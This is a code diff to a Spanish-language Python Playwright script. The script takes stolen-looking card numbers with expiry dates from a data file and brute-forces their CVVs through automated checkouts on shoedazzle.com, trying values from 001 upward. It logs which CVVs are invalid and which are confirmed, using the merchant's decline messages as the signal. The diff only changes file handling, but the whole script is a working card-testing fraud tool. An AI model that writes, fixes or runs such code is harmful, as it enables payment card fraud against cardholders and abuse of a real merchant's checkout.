@@ -14,8 +14,6 @@ import subprocess
 init(autoreset=True)
 
 # Constantes de archivos
-EMAILS_FILE = "CORREOS.txt"
-USED_EMAILS_FILE = "emails_usados.txt"
 DATA_FILE = "DATA.txt"
 CVV_VALIDOS_FILE = "CVV_VALIDOS.txt"
 CVV_INVALIDOS_FILE = "CVV_INVALIDOS.txt"
@@ -44,7 +42,7 @@ def check_health_shoedazzlepage(url="https://www.shoedazzle.com/"):
         try:
             with sync_playwright() as p:
                 browser = p.chromium.launch(headless=True)
-                context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+                context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/122.0.0.0 Safari/537.36")
                 page = context.new_page()
                 response = page.goto(url, timeout=60000, wait_until="load")
                 status = response.status if response else None
@@ -77,10 +75,11 @@ def generar_email():
 
 def get_start_cvv(card_number, month, year):
     """Obtiene el siguiente CVV a probar para una tarjeta específica."""
-    if not os.path.exists(CVV_INVALIDOS_FILE):
-        return "001"
+    # Solo necesario si se va a escribir, aquí solo lectura
     cvv_pattern = re.compile(rf"^{re.escape(card_number)}\|{month}\|{year}\|(\d{{3}})$")
     max_cvv = 0
+    if not os.path.exists(CVV_INVALIDOS_FILE):
+        return "001"
     with open(CVV_INVALIDOS_FILE, "r") as file:
         for line in file:
             match = cvv_pattern.match(line.strip())
@@ -110,6 +109,7 @@ def remover_tarjeta_de_data(numero, mes, ano):
         return
     with open(DATA_FILE, "r") as f:
         lineas = f.readlines()
+    # No es necesario asegurar aquí, porque si no existe, ya retorna antes
     with open(DATA_FILE, "w") as f:
         for linea in lineas:
             if f"{numero}|{mes}|{ano}" not in linea:
@@ -201,6 +201,7 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
     
     if CVV_DOES_NOT_MATCH in mensaje or page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
         print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
+        ensure_file_exists(CVV_INVALIDOS_FILE)
         with open(CVV_INVALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         siguiente = str(int(cvv) + 1).zfill(3)
@@ -214,7 +215,8 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         return None
 
     if "declined" in mensaje or page.get_by_text(TRANSACTION_DECLINED).is_visible():
-        print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO" + Style.RESET_ALL)
+        print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO ✅" + Style.RESET_ALL)
+        ensure_file_exists(CVV_VALIDOS_FILE)
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
         remover_tarjeta_de_data(numero, mes, ano)
@@ -228,6 +230,7 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
 
     if page.get_by_text("contact your bank to release the hold").is_visible():
         print(Fore.YELLOW + f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}" + Style.RESET_ALL)
+        ensure_file_exists(CVV_VALIDOS_FILE)
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
         return None
@@ -283,8 +286,16 @@ def iniciar_checkout(page, email):
     preparar_checkout(page)
 
 
+def ensure_file_exists(filepath):
+    """Ensure the file exists, create it if not."""
+    if not os.path.exists(filepath):
+        with open(filepath, "w") as f:
+            pass
+
+
 def obtener_cvv_inicial(numero, mes, ano):
     """Permite al usuario elegir iniciar desde el siguiente CVV, desde 001 o ingresar uno manualmente, siempre."""
+    # Solo lectura, no es necesario asegurar aquí
     ultimo_cvv = None
     if os.path.exists(CVV_INVALIDOS_FILE):
         cvv_pattern = re.compile(rf"^{re.escape(numero)}\|{mes}\|{ano}\|(\d{{3}})$")
@@ -349,7 +360,7 @@ def procesar_tarjeta(tarjeta_linea):
     """Procesa una tarjeta probando diferentes CVVs hasta encontrar uno válido o agotar los intentos."""
     numero, mes, ano = tarjeta_linea.split("|")
     chrome_path = get_chrome_path()
-    # start_cvv = get_start_cvv(numero, mes, ano)
+    # No es necesario asegurar aquí, solo se asegura al escribir
     start_cvv = obtener_cvv_inicial(numero, mes, ano)
     if not start_cvv:
         print("No se puede iniciar el proceso para esta tarjeta.")
@@ -386,7 +397,6 @@ def procesar_tarjeta(tarjeta_linea):
         else:
             break
 
-
 def cargar_tarjetas_disponibles():
     """Carga todas las tarjetas disponibles desde DATA.txt."""
     if not os.path.exists(DATA_FILE):
@@ -394,7 +404,6 @@ def cargar_tarjetas_disponibles():
         return []
     with open(DATA_FILE, "r") as f:
         return [line.strip() for line in f if "|" in line]
-
 
 def cargar_tarjetas_validadas():
     """Carga los números de tarjetas que ya tienen un CVV válido."""
